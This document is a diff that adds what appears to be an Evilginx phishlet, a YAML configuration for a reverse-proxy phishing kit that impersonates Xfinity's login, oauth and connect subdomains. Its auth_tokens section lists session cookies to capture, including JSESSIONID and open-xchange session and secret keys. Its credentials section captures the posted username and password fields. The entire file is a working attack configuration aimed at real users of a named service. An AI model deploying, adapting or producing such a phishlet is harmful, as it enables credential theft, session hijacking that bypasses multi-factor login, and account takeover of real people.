@@ -1,0 +1,22 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'xfinity.com', session: true, is_landing: true}
+  - {phish_sub: 'oauth', orig_sub: 'oauth', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'xfinity.com', session: true, is_landing: false}
+sub_filters:
+#  - {triggers_on: '', orig_sub: '', domain: '', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'connect.xfinity.com'
+    keys: ['JSESSIONID', 'open-xchange-session-8QtBWswMxAL0XDWLJN1siQ', 'open-xchange-secret-8QtBWswMxAL0XDWLJN1siQ', 'open-xchange-public-session-2PmuAufm7xN0NvHcA2ctQ', 'OXBETA']
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.xfinity.com'
+  path: '/'
